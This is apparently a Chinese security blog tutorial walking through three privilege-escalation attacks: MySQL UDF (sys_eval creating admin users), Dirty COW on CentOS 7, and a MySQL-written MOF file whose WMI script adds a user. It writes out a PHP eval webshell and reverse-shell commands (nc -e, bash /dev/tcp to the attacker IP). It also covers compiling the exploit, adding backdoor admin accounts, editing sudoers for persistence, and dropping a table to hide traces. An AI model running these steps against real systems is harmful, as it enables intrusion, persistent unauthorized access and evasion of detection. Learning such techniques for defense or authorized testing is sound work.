## 前言

> 先把前辈们的以前的干货理解透

## udf提权

经典提权漏洞，每次面试必问。

### 原理

UDF简称为User Defined
Function，为用户自定义函数。udf提权为创建自定义函数(sys_eval)，在mysql调用这个自定义函数，获取对方主机的system的shell权限。简单来说就是把提权脚本放到对方mysql指定的目录下，创建自定义函数，获得shell权限。

> 1.Mysql版本大于5.1版本：udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。  
> 2.Mysql版本小于5.1版本： udf.dll文件在3.Windows2003下放置于c:\windows\system32，  
> 4.在windows2000下放置于c:\winnt\system32。  
> 如果目录不存在则可以利用webshell创建目录即可。

### 提权条件

1、获取到对方mysql的shell，或者是获取到mysql账号密码，能够调用mysql语句  
2、对方mysql具有insert和delete权限，也就是可写可删除添加能够创建目录，写入文件。  
`show global variables like 'secure%';`  
当secure_file_priv为空可以写入  
为NULL不可写入  
指定路径可以写入

查看主机架构和操作系统  
`show variables like '%compile%'; `  
确认mysql目录结构和plugin目录结构  
`show variables like 'plugin%'; #查找具体目录 select @@basedir;#查看mysql目录`

### 步骤

1.Webshell把文件放plugin目录，使用mysql终端，创建自定义函数  
`create function sys_eval returns string soname ‘udf.dll’;`

    
    
    select sys_eval('whoami'); 
    select cmdshell(‘net user hsy 123456 /add’); #添加用户
    
    select cmdshell(‘net localgroup administrators hsy /add’); #将用户加到管理组
    
    drop function sys_eval; #删除函数
    
    DROP TABLE data; //为了删除痕迹，把刚刚新建的data表删掉
    

## 脏牛提权

### 原理

CVE-2016-5195 即dirtyCOW，俗称「脏牛」漏洞，是 Linux Kernel 中的条件竞争漏洞，攻击者可以利用 Linux kernel
中的 COW（Copy-on-Write）技术中存在的逻辑漏洞完成对文件的越权读写。

由于get_user_page内核函数在处理Copy-on-Write的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。

### 漏洞危害

低权限用户利用脏牛漏洞可在Linux系统实现本地提权漏洞。

### 影响范围

    
    
    Centos7/RHEL7     3.10.0-327.36.3.el7
    Cetnos6/RHEL6     2.6.32-642.6.2.el6
    Ubuntu 16.10      4.8.0-26.28
    Ubuntu 16.04      4.4.0-45.66
    Ubuntu 14.04      3.13.0-100.147
    Debian 8          3.16.36-1+deb8u2
    Debian 7          3.2.82-1
    

### 步骤

先看一下centos7的版本环境

`uname -a`  
![1Q30S.png](https://image.3001.net/images/20220613/1655058716_62a6311c5d96c3a7ec318.png!small)  
可以发现是在上述漏洞范围之类  
进行环境搭建

    
    
    yum -y insall http php //下载http、php
    service httpd start //开启httpd服务
    sudo systemctl stop firewalld  //关闭防火墙
    /sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPT //开启80端口
    

测试phpinfo写入/var/www/html里面

    
    
    echo "<?php @eval($_POST[a]);?>" > /var/www/html/shell.php
    

![1Q2xg.png](https://image.3001.net/images/20220613/1655058717_62a6311d352e6975618e5.png!small)  
连接蚁剑，查看权限，只有apache的权限  
![1Q6JB.png](https://image.3001.net/images/20220613/1655058718_62a6311e13eb84c6ad98f.png!small)  
上传脏牛提权exp，上传到/tmp可读可写的文件夹，[exp地址](https://github.com/FireFart/dirtycow)  
![1Q8fs.png](https://image.3001.net/images/20220613/1655058718_62a6311ec232d2e1d9f58.png!small)  
反弹shell到kali

    
    
    kali:nc -lvvp 1234
    靶机：	
    	nc  攻击机ip 1234 -e /bin/sh  （目标主机上有nc）
    	bash -i >& /dev/tcp/攻击机ip/1234 0>&1  （目标主机上没有nc）
    

使用python切换完全交互shell

    
    
    python -c 'import pty;pty.spawn("/bin/sh")'
    

编译EXP

    
    
    gcc -pthread dirty.c -o dirty -lcrypt
    

生成dirty文件,进行提权。并生成一个管理员账号：账号名firefart和密码为test。

    
    
    ./dirty 密码
    

获得备份密码  
![1QuBK.png](https://image.3001.net/images/20220613/1655058721_62a63121868c1b6999ff3.png!small)  
执行成功获得以下命令，再通过cat /etc/passwd是否存在firefart账号，不存在则无脏牛漏洞  
![1QIZa.png](https://image.3001.net/images/20220613/1655058722_62a6312251d37b371c7fa.png!small)  
进行权限维持，如找到一台主机存在脏牛漏洞的话，切换到firefart临时超级管理员后

    
    
    adduser l3ife //添加普通用户
    passwd l3ife //改密码
    vim /etc/sudoers，在root下面一行添加
        root ALL=(ALL) ALL
    		qaz ALL=(ALL) ALL
    给l3ife超级管理员权限~~~~
    

## mof提权

### 原理

继udf提权后，mof提权由于Windows系统下(C:/windows/system32/wbem/mof/nullevt.mof),存在一个mof文件，特点是以system权限自动运行文件内脚本，mof提权将我们写好的mof文件导入该目录文件里，自动执行我们语句。

### 提权条件

1、获取mysql的shell或者获取mysql账号密码  
2、目录可读写  
3、mysql具有insert和delete权限，可写可删除能创建目录，写入文件

进行查看写入路径  
`show global variables like '%secure%';`  
![1GZyI.png](https://image.3001.net/images/20220613/1655058722_62a63122c9a8376c680e9.png!small)  
为空则可以写入文件

### 步骤

把mof文件路径写入

    
    
    select load_file('mof文件路径') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
    

mof文件如下

    
    
    #pragma namespace("\\\\.\\root\\subscription")
        instance of __EventFilter as $EventFilter
    {
        EventNamespace = "Root\\Cimv2";
        Name = "filtP2";
        Query = "Select * From __InstanceModificationEvent "
        "Where TargetInstance Isa \"Win32_LocalTime\" "
        "And TargetInstance.Second = 5";
        QueryLanguage = "WQL";
    };~~~~
    instance of ActiveScriptEventConsumer as $Consumer
    {
        Name = "consPCSV2";
        ScriptingEngine = "JScript";
        ScriptText =
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user aaa 123456 /add\")";
    };
        instance of __FilterToConsumerBinding
    {
    Consumer = $Consumer;
    Filter = $EventFilter;
    };
    

![1GvsD.png](https://image.3001.net/images/20220613/1655058723_62a6312384c0a636d86ea.png!small)

    
    
    执行完毕替换net user hsy 123456 /add换为
    net localgroup administrators hsy/add 即可将用户提升管理员权限
    

